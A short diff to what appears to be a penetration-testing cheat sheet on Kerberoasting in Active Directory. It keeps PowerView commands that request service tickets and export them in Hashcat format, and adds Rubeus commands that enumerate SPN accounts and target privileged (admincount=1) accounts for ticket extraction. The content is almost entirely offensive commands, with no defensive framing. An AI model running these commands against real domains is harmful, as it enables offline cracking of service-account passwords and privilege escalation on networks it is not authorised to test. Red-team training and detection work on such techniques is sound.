@@ -37,3 +37,13 @@ Get-DomainUser -Identity <spn> | Get-DomainSPNTicket -Format Hashcat
 ```
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv <filename> -NoTypeInformation
 ```
+
+-Using Rubeus to get overview of all SPN:
+```
+.\Rubeus.exe kerberoast /stats
+```
+
+-Using Rubeus to view account with high level privilege:
+```
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
